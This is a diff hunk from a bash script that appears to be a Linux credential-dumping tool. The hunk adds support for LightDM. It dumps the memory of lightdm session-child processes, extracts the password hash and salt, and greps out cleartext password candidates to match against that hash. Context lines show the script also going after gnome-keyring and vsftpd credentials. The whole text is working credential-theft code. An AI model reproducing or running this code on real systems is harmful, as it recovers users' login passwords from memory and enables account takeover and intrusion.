@@ -148,6 +148,27 @@ if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep gnome-keyring) ]]; then
 	fi
 fi
 
+#Support LightDM
+if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep lightdm | grep session-child) ]]; then
+	SOURCE="[SYSTEM - LIGHTDM]"
+	PID="$(ps -eo pid,command | grep lightdm | sed -rn '/session\-child/p' | awk -F ' ' '{ print $1 }')"
+
+	#if exists aka someone logged into lightdm then extract...
+	if [[ $PID ]]; then
+		while read -r pid; do
+			dump_pid "$pid" /tmp/dump
+			HASH=$(strings "/tmp/dump.${pid}" | grep -E -m 1 '^\$.\$.+\$')
+			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
+			DUMP="$(strings "/tmp/dump.${pid}" | grep -E '^_pammodutil_getspnam_' -A1)"
+			#Remove dupes to speed up processing
+			DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
+			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
+			#cleanup
+			rm -rf "/tmp/dump.${pid}"
+		done <<< "$PID"
+	fi
+fi
+
 #Support VSFTPd - Active Users
 if [[ -e "/etc/vsftpd.conf" ]]; then
 		SOURCE="[SYSTEM - VSFTPD]"
